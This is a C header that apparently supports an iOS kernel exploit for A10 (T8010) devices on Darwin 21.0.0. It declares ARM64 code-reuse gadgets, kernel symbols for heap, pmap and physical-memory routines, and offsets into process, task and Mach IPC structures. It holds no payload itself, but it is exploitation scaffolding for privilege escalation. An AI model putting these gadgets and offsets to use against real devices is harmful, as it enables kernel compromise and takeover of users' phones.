#include <stdint.h>

#define T8010_19A346_KVERSION "Darwin Kernel Version 21.0.0: Sun Aug 15 20:55:57 PDT 2021; root:xnu-8019.12.5~1/RELEASE_ARM64_T8010"
#define VM_KERNEL_LINK_ADDR 0xFFFFFE0007004000ULL


enum kgadget {
  KGADGET_POPULATE,
  KGADGET_PROLOGUE,
  KGADGET_MOV_X5_X6__BR_X15,
  KGADGET_MOV_X6_X9__BR_X11,
  KGADGET_MOV_X7_X14__BR_X15,
  KGADGET_MOV_X9_X1__BR_X10,
  KGADGET_MOV_X15_X2__BR_X3,
  KGADGET_MOV_X15_X1__BR_X2,
  KGADGET_MOV_X14_X3__BR_X4,
  KGADGET_MOV_X11_X4__BR_X2,
  KGADGET_MOV_X10_X1__BR_X3,
  KGADGET_ADD_X0_X0_0X40__RET,
};

enum ksymbol {
  KSYMBOL_KERNPROC,
  KSYMBOL_RET_300,
  KSYMBOL_KFREE,
  KSYMBOL_PANIC,
  KSYMBOL_KALLOC_EXT,
  KHEAP_DATA_BUFFERS,
  KHEAP_DEFAULT,
  KHEAP_KEXT,
  necp_client_add_site,
  KSYMBOL_IOMalloc,
  KSYMBOL_IOFree,
  __ZZ17IOMalloc_internalE4site,
  pipespace_site,
  KSYMBOL_KFREE_EXT,
  KSYMBOL_KERNEL_PMAP,
  KSYMBOL_MMU_KVTOP,
  KSYMBOL_PMAP_VTOPHYS,
  KSYMBOL_PHYSTOKV,
  KSYMBOL_ml_phys_read_data,
};

extern uint32_t off_p_pid;
extern uint32_t off_p_pfd;
extern uint32_t off_p_list_le_prev;
extern uint32_t off_p_task;
extern uint32_t off_task_itk_space;
extern uint32_t off_fd_ofiles;
extern uint32_t off_fp_fglob;
extern uint32_t off_fg_data;
extern uint32_t off_pb_buffer;
extern uint32_t off_ipc_space_is_table;
extern uint32_t off_ipc_space_is_task;
extern uint32_t off_ipc_port_ip_receiver;
extern uint32_t off_ipc_port_ip_kobject;
extern uint32_t off_ipc_port_ikmq_base;
extern uint32_t off_ipc_kmsg_ikm_header;
extern uint32_t off_ipc_kmsg_ikm_data;
extern uint32_t off_mach_msg_header_t_msgh_remote_port;

uint64_t kgad(enum kgadget sym);
uint64_t ksym(enum ksymbol sym);
void offsets_init(void);